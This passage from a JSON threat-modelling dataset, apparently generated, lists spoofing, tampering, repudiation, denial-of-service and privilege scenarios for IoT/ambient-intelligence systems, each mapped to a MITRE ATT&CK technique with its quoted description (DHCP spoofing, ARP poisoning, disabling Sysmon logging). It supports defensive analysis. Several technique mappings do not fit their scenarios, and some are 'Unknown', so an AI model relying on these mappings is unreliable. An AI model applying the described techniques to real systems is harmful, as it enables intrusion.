                    "Assumption": "Communications are not securely encrypted or authenticated.",
                    "Role": "System Administrator",
                    "Condition": "Lack of end-to-end encryption and authentication."
                },
                {
                    "Assumption": "Network segmentation and isolation are not implemented.",
                    "Role": "Network Architect",
                    "Condition": "Flat network topology and no traffic segmentation."
                }
            ],
            "Potential Impact": "Unauthorized access to confidential data and potential data leakage.",
            "MITRE ATT&CK Keywords": [
                "Network Exploitation",
                "Vulnerability Exploitation",
                "Sensitive Data Access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the communication infrastructure with traffic, causing a system outage.",
            "Assumptions": [
                {
                    "Assumption": "Network infrastructure is susceptible to high traffic volumes.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of traffic filtering and rate limiting."
                },
                {
                    "Assumption": "There are no DDoS mitigation mechanisms in place.",
                    "Role": "System Administrator",
                    "Condition": "Absence of DDoS protection services."
                },
                {
                    "Assumption": "Critical services are not redundant and failover mechanisms are weak.",
                    "Role": "System Architect",
                    "Condition": "Single points of failure exist in the infrastructure."
                }
            ],
            "Potential Impact": "Disruption of system availability, leading to service downtime and user dissatisfaction.",
            "MITRE ATT&CK Keywords": [
                "DDoS Attack",
                "Network Flooding",
                "Service Disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious actor exploits vulnerabilities in the AI/ML models causing them to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "AI/ML models have vulnerabilities that can be exploited.",
                    "Role": "Security Researcher",
                    "Condition": "Known weaknesses in AI/ML algorithms."
                },
                {
                    "Assumption": "The system does not have failover protocols for AI/ML services.",
                    "Role": "System Architect",
                    "Condition": "Lack of fault-tolerant design for AI services."
                },
                {
                    "Assumption": "AI/ML models are not monitored for abnormal behavior.",
                    "Role": "Data Scientist",
                    "Condition": "Absence of anomaly detection in AI/ML operations."
                }
            ],
            "Potential Impact": "AI/ML models become unresponsive or generate incorrect results, affecting system operations.",
            "MITRE ATT&CK Keywords": [
                "AI/ML Exploitation",
                "Algorithm Manipulation",
                "Service Unavailability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disrupts the power supply of the IoT system components causing a service outage.",
            "Assumptions": [
                {
                    "Assumption": "IoT components are not connected to an uninterruptible power supply (UPS).",
                    "Role": "Facility Manager",
                    "Condition": "Lack of backup power solutions."
                },
                {
                    "Assumption": "There are no physical security measures to prevent tampering with power sources.",
                    "Role": "Security Manager",
                    "Condition": "Weak physical security controls."
                },
                {
                    "Assumption": "No contingency plans are in place for power loss.",
                    "Role": "Business Continuity Planner",
                    "Condition": "Absence of business continuity and disaster recovery plans."
                }
            ],
            "Potential Impact": "Complete service disruption and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "Power Tampering",
                "Physical Denial of Service",
                "Service Outage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability to gain administrative privileges on the system.",
            "Assumptions": [
                {
                    "Assumption": "System software has unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Delayed application of security patches."
                },
                {
                    "Assumption": "Access controls are not properly configured to limit privilege escalation.",
                    "Role": "Security Engineer",
                    "Condition": "Weak or misconfigured access control policies."
                },
                {
                    "Assumption": "Intrusion detection systems (IDS) are not effectively monitoring for anomalous privilege escalations.",
                    "Role": "Security Analyst",
                    "Condition": "Inadequate or outdated IDS rules."
                }
            ],
            "Potential Impact": "Full system control by the attacker, allowing unauthorized access and manipulation.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Software Vulnerability Exploitation",
                "Administrative Access"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses default or easily guessable passwords to gain elevated access to system components.",
            "Assumptions": [
                {
                    "Assumption": "Default credentials are not changed after initial setup.",
                    "Role": "System Installer",
                    "Condition": "Neglect in changing default settings."
                },
                {
                    "Assumption": "Password policies do not enforce strong, unique passwords.",
                    "Role": "System Administrator",
                    "Condition": "Weak password policy enforcement."
                },
                {
                    "Assumption": "There is no account monitoring for failed login attempts.",
                    "Role": "Security Administrator",
                    "Condition": "Lack of monitoring and alerting for suspicious activity."
                }
            ],
            "Potential Impact": "Compromise of critical system components, leading to unauthorized access and potential sabotage.",
            "MITRE ATT&CK Keywords": [
                "Password Cracking",
                "Default Credentials",
                "Account Hijacking"
            ],
            "mitre_technique": {
                "name": "Password Cracking",
                "description": "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) \n\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",
                "id": "attack-pattern--1d24cdee-9ea2-4189-b08e-af110bf2435d",
                "technique_id": "T1110.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages social engineering to obtain privileged access from an unsuspecting user.",
            "Assumptions": [
                {
                    "Assumption": "Users are not adequately trained to recognize social engineering tactics.",
                    "Role": "Training Coordinator",
                    "Condition": "Lack of cybersecurity awareness training."
                },
                {
                    "Assumption": "The system does not enforce multi-factor authentication (MFA).",
                    "Role": "System Administrator",
                    "Condition": "Single-factor authentication is used."
                },
                {
                    "Assumption": "Access control mechanisms do not enforce the principle of least privilege.",
                    "Role": "Security Engineer",
                    "Condition": "Excessive user privileges."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive functions and data, potentially leading to significant damage.",
            "MITRE ATT&CK Keywords": [
                "Phishing",
                "Social Engineering",
                "Privilege Misuse"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "10",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a user device to gain unauthorized access to the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "The AmI system relies on device identifiers for authentication.",
                    "Role": "Attack Surface",
                    "Condition": "Normal operation with weak or no additional verification of device legitimacy."
                },
                {
                    "Assumption": "The attacker has physical access to a user device or can intercept communication.",
                    "Role": "Adversary",
                    "Condition": "Proximity to the user's environment or compromised network communication."
                },
                {
                    "Assumption": "Biometrics and hardware tokens are not always used effectively.",
                    "Role": "System Design",
                    "Condition": "Partial or inconsistent implementation of strong authentication methods."
                }
            ],
            "Potential Impact": "Unauthorized access can lead to data breaches and loss of control over smart environment devices.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity theft",
                "user device",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs sensor data to manipulate the AI/ML models and disrupt system behavior.",
            "Assumptions": [
                {
                    "Assumption": "Sensor data is transmitted over insecure or unencrypted channels.",
                    "Role": "Network Security",
                    "Condition": "Use of unprotected communication channels within the system."
                },
                {
                    "Assumption": "The attacker can introduce false data into the communication stream.",
                    "Role": "Adversary",
                    "Condition": "Access to network points where sensor data is aggregated or relayed."
                },
                {
                    "Assumption": "Systems lack robust validation mechanisms for sensor data.",
                    "Role": "System Design",
                    "Condition": "No or insufficient checks on data integrity and validity."
                }
            ],
            "Potential Impact": "Data integrity and system functionality are compromised, potentially causing unsafe conditions or system malfunction.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "sensor data",
                "false data injection",
                "AI manipulation",
                "ML models"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a malicious IoT device to impersonate an actuator, sending fake commands to other networked devices.",
            "Assumptions": [
                {
                    "Assumption": "New devices are not adequately authenticated before network integration.",
                    "Role": "Network Administration",
                    "Condition": "Automated or minimal onboarding processes for new devices."
                },
                {
                    "Assumption": "The attacker can introduce the malicious device into the network.",
                    "Role": "Adversary",
                    "Condition": "Physical access to the network or remote exploit capabilities."
                },
                {
                    "Assumption": "Actuator commands are accepted without rigorous validation.",
                    "Role": "System Design",
                    "Condition": "Weak or no checks on command authenticity from devices within the network."
                }
            ],
            "Potential Impact": "Unauthorized control of actuators leading to potential physical damage or disruption to services in the environment.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "malicious device",
                "network integration",
                "actuator control",
                "fake commands"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with firmware updates for sensors and actuators, introducing malicious code.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are delivered over non-secure channels.",
                    "Role": "System Updates",
                    "Condition": "Use of insecure mechanisms for firmware distribution."
                },
                {
                    "Assumption": "The attacker has the capability to intercept and modify firmware files.",
                    "Role": "Adversary",
                    "Condition": "Access to the distribution network or compromise of update servers."
                },
                {
                    "Assumption": "Firmware integrity checks are not performed rigorously.",
                    "Role": "System Design",
                    "Condition": "Lack of or weak integrity verification for firmware updates."
                }
            ],
            "Potential Impact": "Malicious firmware can compromise sensor and actuator functionality, possibly leading to system control under attacker command.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware update",
                "malicious code",
                "sensor",
                "actuator"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with the AI/ML model data to skew decision-making processes.",
            "Assumptions": [
                {
                    "Assumption": "AI/ML models are stored or processed in environments without proper access controls.",
                    "Role": "Data Security",
                    "Condition": "Inadequate protection of AI/ML model files and training datasets."
                },
                {
                    "Assumption": "The attacker has privileges to alter or replace model data.",
                    "Role": "Adversary",
                    "Condition": "Compromised user accounts or insider threats."
                },
                {
                    "Assumption": "Models do not undergo regular integrity checks or audits.",
                    "Role": "AI Governance",
                    "Condition": "Absence of systematic verification processes for model integrity."
                }
            ],
            "Potential Impact": "Corrupted AI/ML models lead to incorrect or unpredictable system behavior, potentially affecting safety and security.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "AI model",
                "ML data",
                "decision-making",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with sensor data stored in data repositories to produce inaccurate historical analyses.",
            "Assumptions": [
                {
                    "Assumption": "Data repositories are accessible without strict authentication and authorization mechanisms.",
                    "Role": "Data Storage",
                    "Condition": "Weak or no access control policies for database and cloud storage."
                },
                {
                    "Assumption": "The attacker can gain read/write access to data records.",
                    "Role": "Adversary",
                    "Condition": "Compromised credentials or exploitation of vulnerabilities."
                },
                {
                    "Assumption": "No effective monitoring or anomaly detection for data alterations.",
                    "Role": "Operational Security",
                    "Condition": "Lack of real-time data integrity monitoring tools."
                }
            ],
            "Potential Impact": "Inaccurate data analysis impacts informed decision-making, potentially leading to system inefficiencies or failures.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "sensor data",
                "data repository",
                "unauthorized write",
                "historical analysis"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies performing actions that affected the AmI environment, following access using compromised credentials.",
            "Assumptions": [
                {
                    "Assumption": "System activities are not logged with sufficient detail or are easily manipulated.",
                    "Role": "System Logging",
                    "Condition": "Inadequate or tamperable logging mechanisms."
                },
                {
                    "Assumption": "The attacker has access to or has stolen user credentials.",
                    "Role": "Adversary",
                    "Condition": "Phishing, social engineering, or brute force attacks."
                },
                {
                    "Assumption": "Logs are not protected against unauthorized access and modifications.",
                    "Role": "Data Security",
                    "Condition": "Weak access controls and encryption for log files."
                }
            ],
            "Potential Impact": "Compromised system integrity and accountability, affecting trust and potential system abuse without traceable proof.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "credential compromise",
                "user action denial"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes audit logs to cover traces after unauthorized access and manipulation of the system.",
            "Assumptions": [
                {
                    "Assumption": "Audit logs are stored in locations accessible by unauthorized users.",
                    "Role": "Log Management",
                    "Condition": "Log files are inadequately protected within the storage infrastructure."
                },
                {
                    "Assumption": "The attacker has sufficient privileges to alter or delete logs.",
                    "Role": "Adversary",
                    "Condition": "Escalated privileges through exploits or stolen credentials."
                },
                {
                    "Assumption": "Log alteration is not detected by the system.",
                    "Role": "Operational Security",
                    "Condition": "Lack of integrity checks and real-time monitoring of audit logs."
                }
            ],
            "Potential Impact": "Loss of critical forensic evidence, enabling continuation of malicious activities without detection.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit log deletion",
                "unauthorized access",
                "log manipulation"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider falsely claims that system anomalies were not caused by their actions, creating doubt in their involvement.",
            "Assumptions": [
                {
                    "Assumption": "System actions are logged but cannot be uniquely attributed to specific users.",
                    "Role": "User Activity Monitoring",
                    "Condition": "Generic or non-unique user identification in logs."
                },
                {
                    "Assumption": "Insider has sufficient access to perform and disguise their actions.",
                    "Role": "Insider Threat",
                    "Condition": "Privileged access rights without adequate oversight."
                },
                {
                    "Assumption": "Logs and system entries are not audited regularly or effectively.",
                    "Role": "Operational Security",
                    "Condition": "Infrequent or ineffective log audits and reviews."
                }
            ],
            "Potential Impact": "Difficulty in establishing accountability, potentially affecting audit processes and internal investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "insider threat",
                "log audit",
                "user actions",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data collected from sensors is exfiltrated by an attacker exploiting weak network encryption.",
            "Assumptions": [
                {
                    "Assumption": "Data transmitted by sensors is not encrypted or uses weak encryption methods.",
                    "Role": "Data Security",
                    "Condition": "Insufficient encryption standards or protocols in place."
                },
                {
                    "Assumption": "The attacker has access to intercepted network traffic.",
                    "Role": "Adversary",
                    "Condition": "Network compromise or man-in-the-middle attack capability."
                },
                {
